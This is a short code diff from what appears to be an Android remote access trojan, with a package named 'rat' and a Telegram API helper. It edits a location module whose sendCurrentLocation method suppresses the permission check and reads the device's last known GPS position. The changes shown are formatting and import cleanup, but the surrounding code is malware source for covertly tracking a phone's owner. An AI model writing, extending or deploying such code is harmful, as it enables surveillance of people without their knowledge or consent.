@@ -3,7 +3,6 @@ package com.enterprise.rat.commands;
 import android.annotation.SuppressLint;
 import android.content.Context;
 import android.location.Location;
-import android.location.LocationManager;
 import com.enterprise.rat.utils.TelegramApi;
 
 public class LocationManager {
@@ -13,9 +12,10 @@ public class LocationManager {
 
     @SuppressLint("MissingPermission")
     public void sendCurrentLocation() {
-        android.location.LocationManager lm = (android.location.LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
+        android.location.LocationManager lm = 
+            (android.location.LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
         Location loc = null;
-        
+
         try {
             if (lm.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER)) {
                 loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
